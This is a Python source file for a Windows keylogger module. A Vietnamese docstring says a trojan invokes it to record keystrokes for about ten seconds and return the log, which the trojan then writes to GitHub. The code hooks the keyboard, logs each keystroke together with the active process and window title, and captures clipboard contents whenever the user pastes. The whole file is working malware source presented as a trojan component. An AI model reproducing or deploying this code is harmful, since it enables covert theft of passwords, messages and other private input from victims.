import pythoncom
import pyHook
import win32clipboard
from ctypes import *

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

current_window = None
log = ""  # Lưu chuỗi log toàn cục


def get_current_process():
    global log

    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(b'\x00' * 512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)

    log += "\n\n[ PID: %d | %s | %s ]\n" % (pid.value, executable.value.decode(), window_title.value.decode())

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window
    global log

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    if 32 < event.Ascii < 127:
        log += chr(event.Ascii)
    else:
        if event.Key == "V":
            try:
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                log += "\n[PASTE] - %s\n" % pasted_value
            except:
                log += "\n[PASTE] - (error)\n"
        else:
            log += "[%s]" % event.Key

    return True


def run():
    """
    Hàm run() sẽ được trojan gọi. Nó sẽ chạy keylogger trong ~10 giây,
    sau đó trả về log đã ghi được để trojan ghi vào GitHub.
    """
    global log

    log = ""
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()

    print("[*] Keylogger started...")

    # Chạy trong 10 giây rồi kết thúc
    start = kernel32.GetTickCount()
    while kernel32.GetTickCount() - start < 10000:
        pythoncom.PumpWaitingMessages()

    return log or "[No keystroke recorded]"
